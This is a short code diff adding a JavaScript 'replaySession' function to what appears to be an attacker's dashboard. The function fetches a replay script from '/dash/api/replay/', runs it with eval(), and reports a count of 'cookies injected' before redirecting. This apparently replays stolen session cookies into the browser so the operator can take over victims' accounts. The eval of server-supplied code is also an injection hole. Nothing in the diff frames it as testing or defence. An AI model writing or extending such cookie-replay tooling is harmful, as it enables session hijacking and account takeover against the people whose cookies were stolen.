@@ -949,6 +949,23 @@
         }
     }
 
+    // ---------- SESSION REPLAY ----------
+async function replaySession(filename) {
+    try {
+        const res = await fetch(`/dash/api/replay/${filename}`);
+        const data = await res.json();
+        if (data.error) {
+            showToast('❌ Replay failed: ' + data.error, true);
+            return;
+        }
+        // Execute the replay script in the current tab
+        eval(data.replayScript);
+        showToast(`✅ ${data.cookieCount} cookies injected. Redirecting...`);
+    } catch (e) {
+        showToast('❌ Replay error: ' + e.message, true);
+    }
+}
+
     // ---------- EXPORT ----------
     async function exportAll() {
         try {
